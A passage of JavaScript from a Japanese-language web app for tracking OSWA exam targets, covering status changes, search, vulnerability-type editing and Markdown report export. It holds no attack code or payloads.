     <p style="font-size:12px;color:var(--md-on-surface-var);margin-top:10px;line-height:1.6">両方取得すると状態が自動で「proof取得」になります。試験ではこの値のスクリーンショットも必要です。</p>`,
    () => {
      t.localTxt=val("tLocal"); t.proofTxt=val("tProof");
      if (t.localTxt && t.proofTxt) t.status="proof";
      else if (t.findings.length) t.status="exploited";
      renderTargetDetail();
    });
}
function wChangeStatus() {
  const t = webTarget(); if (!t) return;
  const opts = Object.keys(WEB_STATUS).map(k=>`<option value="${k}" ${t.status===k?'selected':''}>${WEB_STATUS[k].label}</option>`).join("");
  openModal("状態を変更", `<label>状態</label><select id="tStatus">${opts}</select>`,
    () => { t.status=val("tStatus"); renderTargetDetail(); });
}
function wDelTarget(id) {
  const t = data.targets.find(x=>x.id===id); if (!t) return;
  if (!confirm(`「${t.name}」を削除しますか？`)) return;
  data.targets = data.targets.filter(x=>x.id!==id);
  wBackList(); toast("🗑 削除しました");
}

function renderWebSearch() {
  const main = document.getElementById("main");
  const q = document.getElementById("searchInput").value.trim().toLowerCase();
  if (!q) { searchMode=false; render(); return; }
  const hits = data.targets.filter(t =>
    (t.name||"").toLowerCase().includes(q) ||
    (t.url||"").toLowerCase().includes(q) ||
    t.findings.some(f=>(f.endpoint||"").toLowerCase().includes(q)||(f.note||"").toLowerCase().includes(q)||vtLabel(f.vulnType).toLowerCase().includes(q)));
  renderWebNav("web");
  const cards = hits.map(t=>{
    const st=webStatusMeta(t.status);
    return `<div class="web-tcard" onclick="wOpen('${t.id}')">
      <div class="web-pcard-top"><span class="web-tstatus ${st.cls}">${st.label}</span></div>
      <h3 class="web-tname">${esc(t.name)}</h3>${t.url?`<div class="web-turl">${esc(t.url)}</div>`:""}
    </div>`;
  }).join("");
  main.innerHTML = `<div class="s-head"><h1>検索: ${esc(q)}</h1><span class="th-count">${hits.length} 件</span></div>
    ${hits.length?`<div class="web-tgrid">${cards}</div>`:emptyState("search_off","一致するターゲットがありません","別のキーワードをお試しください")}`;
}

/* ═══════════════════════════════════════════════════
   脆弱性タイプ編集（フェーズ編集と同じ操作感）
════════════════════════════════════════════════════ */
const VT_PALETTE = ["#e08a4d","#e05c5c","#5aa9e0","#b085e0","#e06a9c","#45c8b0","#e0a944","#3fd07f","#7d9186","#c9a15a"];
function webEditVulnTypes() {
  const rows = data.vulnTypes.map((v,i) => {
    const cnt = data.payloads.filter(p=>p.vulnType===v.id).length + data.targets.reduce((a,t)=>a+t.findings.filter(f=>f.vulnType===v.id).length,0);
    return `<div class="web-vtedit-row">
      <span class="web-vt-swatch" style="background:${v.color}"></span>
      <span class="web-vt-name">${esc(v.label)}</span>
      <span class="web-vt-cnt">${cnt} 件</span>
      <button class="web-vt-act" onclick="webVtRename('${v.id}')">名前</button>
      <button class="web-vt-act" onclick="webVtColor('${v.id}')">色</button>
      <button class="web-vt-act" onclick="webVtMove('${v.id}',-1)" ${i===0?'disabled':''}>↑</button>
      <button class="web-vt-act" onclick="webVtMove('${v.id}',1)" ${i===data.vulnTypes.length-1?'disabled':''}>↓</button>
      <button class="web-vt-act danger" onclick="webVtDelete('${v.id}')">削除</button>
    </div>`;
  }).join("");
  openModal("脆弱性タイプを編集",
    `<div class="web-vtedit-list">${rows}</div>
     <button class="web-vt-add" onclick="webVtAdd()"><span class="material-symbols-rounded" style="font-size:16px">add</span>タイプを追加</button>
     <p class="web-vtedit-note">削除しても、そのタイプの発見・ペイロードは残ります（タイプ未設定になります）。攻撃ログブックのフェーズ編集と同じ操作感です。</p>`,
    null, { okText: "閉じる", onOk: () => { closeModal(); if(appMode==="payload")renderPayloadLib(); else renderTargetDetail?.(); } });
}
function webVtAdd() {
  const color = VT_PALETTE[data.vulnTypes.length % VT_PALETTE.length];
  data.vulnTypes.push({ id: uid(), label: "新しいタイプ", color });
  webEditVulnTypes();
}
function webVtRename(id) {
  const v = vtGet(id); if (!v) return;
  const name = prompt("タイプ名", v.label);
  if (name && name.trim()) { v.label = name.trim(); webEditVulnTypes(); }
}
function webVtColor(id) {
  const v = vtGet(id); if (!v) return;
  const cur = VT_PALETTE.indexOf(v.color);
  v.color = VT_PALETTE[(cur+1) % VT_PALETTE.length];  // パレットを順送り
  webEditVulnTypes();
}
function webVtMove(id, dir) {
  const i = data.vulnTypes.findIndex(v=>v.id===id);
  const j = i + dir;
  if (i<0 || j<0 || j>=data.vulnTypes.length) return;
  [data.vulnTypes[i], data.vulnTypes[j]] = [data.vulnTypes[j], data.vulnTypes[i]];
  webEditVulnTypes();
}
function webVtDelete(id) {
  const v = vtGet(id); if (!v) return;
  if (!confirm(`タイプ「${v.label}」を削除しますか？（発見・ペイロードは残ります）`)) return;
  data.vulnTypes = data.vulnTypes.filter(x=>x.id!==id);
  webEditVulnTypes();
}

/* ═══════════════════════════════════════════════════
   OSWA公式準拠レポート
   構造: Local.txt/Proof.txt → Vulnerability 1..X
         (Description/Impact/Steps to Reproduce/Payload・Requests)
         → Screenshots → Steps(方法論) → Additional Items
════════════════════════════════════════════════════ */
function wOpenReport() {
  const t = webTarget(); if (!t) return;
  window.__wReportOpts = window.__wReportOpts || { jp:true, en:true, req:true, flags:true, remediation:false };
  renderTargetReport();
}
function renderTargetReport() {
  const main = document.getElementById("main");
  const t = webTarget(); if (!t) { wBackList(); return; }
  const o = window.__wReportOpts;

  const confirmed = t.findings.filter(f=>f.verdict==="confirmed");
  const vulnBlocks = t.findings.map((f, i) => {
    const c = vtColor(f.vulnType);
    let b = `<div class="web-doc-vuln-h"><span class="web-vt" style="background:${c}22;color:${c}">${esc(vtLabel(f.vulnType).split(" ")[0])}</span> ${i+1}. ${esc(vtLabel(f.vulnType).split(" ")[0])} in ${esc(f.endpoint)||"(endpoint)"}</div>`;
    b += `<div class="web-doc-sub">Description</div>`;
    if (o.jp) b += `<div class="web-doc-jp">${esc(f.note)||"（説明を記入）"}</div>`;
    if (o.en) b += `<div class="web-doc-en">English (自分で記入)…</div>`;
    b += `<div class="web-doc-sub">Impact</div><div class="web-doc-jp">${esc(f.impact)||"（影響を記入）"}</div>`;
    if (f.steps && f.steps.length) {
      b += `<div class="web-doc-sub">Steps to Reproduce</div><div class="web-doc-steps">`;
      f.steps.forEach((s,si)=> b += `<div class="web-doc-step"><span class="n">${si+1}.</span><span>${esc(s)}</span></div>`);
      b += `</div>`;
    }
    if (o.req && (f.request || f.payload)) {
      b += `<div class="web-doc-sub">Payload / Requests</div><pre class="web-doc-code">${esc(f.request||f.payload)}</pre>`;
    }
    return b;
  }).join("");

  const tg = (key,label) => `<div class="th-side-toggle" onclick="wToggleReport('${key}')"><span>${label}</span><span class="th-sw ${o[key]?'on':''}"></span></div>`;

  main.innerHTML = `
    <div class="web-report">
      <div class="web-report-doc">
        <div class="th-crumb"><button onclick="wOpen('${t.id}')">← ターゲットに戻る</button></div>
        <div class="web-doc-title">${esc(t.name)} — OSWA Assessment Report</div>
        <div class="web-doc-meta">
          <span>URL: ${esc(t.url)||"—"}</span>
          <span>Stack: ${esc((t.techStack||[]).join("/"))||"—"}</span>
        </div>

        ${o.flags ? `<div class="web-doc-vuln-h">Local.txt / Proof.txt</div>
          <div class="web-doc-flags">
            <div><b>local.txt:</b> ${esc(t.localTxt)||"（値を記入 + スクショ）"}</div>
            <div><b>proof.txt:</b> ${esc(t.proofTxt)||"（値を記入 + スクショ）"}</div>
          </div>` : ""}

        ${vulnBlocks || "<div class='th-side-empty'>発見がありません</div>"}

        <div class="web-doc-vuln-h">Screenshots</div>
        <div class="web-doc-jp">local.txt / proof.txt のスクリーンショットをここに貼付（試験必須）。Web UI経由なら Burp とブラウザ画面、シェル経由なら cat/type の出力。</div>

        <div class="web-doc-vuln-h">Steps (Methodology)</div>
        <div class="web-doc-jp">${esc(t.notes)||"攻略の方法論を、技術的に熟練した読者が再現できるレベルで記述。"}</div>
      </div>
      <div class="web-report-side">
        <div class="th-side-sec"><h4>出力フォーマット</h4>
          <div class="th-fmt-opt on"><span class="material-symbols-rounded" style="font-size:16px;color:var(--md-primary)">check_box</span>Markdown (.md)</div>
        </div>
        <div class="th-side-sec"><h4>含める内容</h4>
          ${tg("flags","local / proof.txt")}
          ${tg("jp","日本語メモ")}
          ${tg("en","英訳欄")}
          ${tg("req","HTTPリクエスト PoC")}
          ${tg("remediation","Remediation 欄")}
        </div>
        <button class="th-dl-btn" onclick="wDownloadReport()"><span class="material-symbols-rounded" style="font-size:16px">download</span>レポートを書き出す</button>
        <p class="th-report-hint">OSWA公式構造準拠（Description/Impact/Steps/PoC）。再現手順が命。AIは使いません。英語の地の文は英訳欄に自分で記入。</p>
      </div>
    </div>
  `;
}
function wToggleReport(key){ window.__wReportOpts[key] = !window.__wReportOpts[key]; renderTargetReport(); }

function wBuildReportMarkdown() {
  const t = webTarget(); if (!t) return "";
  const o = window.__wReportOpts;
  let md = `# ${t.name} — OSWA Assessment Report\n\n`;
  md += `- **URL:** ${t.url||"—"}\n- **Tech Stack:** ${(t.techStack||[]).join(", ")||"—"}\n\n`;

  if (o.flags) {
    md += `## Local.txt / Proof.txt\n\n`;
    md += `- **local.txt:** ${t.localTxt||"__________"}\n`;
    md += `- **proof.txt:** ${t.proofTxt||"__________"}\n\n`;
    md += `> スクリーンショットをここに添付（試験必須）\n\n`;
  }

  t.findings.forEach((f, i) => {
    md += `## Vulnerability ${i+1}: ${vtLabel(f.vulnType).split(" ")[0]} in ${f.endpoint||"(endpoint)"}\n\n`;
    md += `### Description\n\n`;
    if (o.jp && f.note) md += `${f.note}\n\n`;
    if (o.en) md += `_English:_ ________________________\n\n`;
    md += `### Impact\n\n${f.impact||"________________________"}\n\n`;
    if (f.steps && f.steps.length) {
      md += `### Steps to Reproduce\n\n`;
      f.steps.forEach((s,si)=> md += `${si+1}. ${s}\n`);
      md += `\n`;
    }
    if (o.req && (f.request||f.payload)) {
      md += `### Payload / Requests\n\n\`\`\`http\n${f.request||f.payload}\n\`\`\`\n\n`;
    }
    if (o.remediation) md += `### Remediation\n\n________________________\n\n`;
  });

  md += `## Screenshots\n\nlocal.txt / proof.txt のスクリーンショットをここに添付。\n\n`;
  md += `## Steps (Methodology)\n\n${t.notes||"攻略の方法論を、再現可能なレベルで記述。"}\n\n`;
  md += `## Additional Items Not Mentioned in the Report\n\n________________________\n`;
  return md;
}
function wDownloadReport() {
  const t = webTarget(); if (!t) return;
  const md = wBuildReportMarkdown();
  const name = `OSWA_${t.name.replace(/\s+/g,"_").slice(0,30)}_${new Date().toISOString().slice(0,10)}`;
  const a = Object.assign(document.createElement("a"), {
    href: URL.createObjectURL(new Blob([md],{type:"text/markdown"})), download: name+".md" });
  document.body.appendChild(a); a.click(); a.remove();
  toast("📥 OSWAレポートを書き出しました");
}
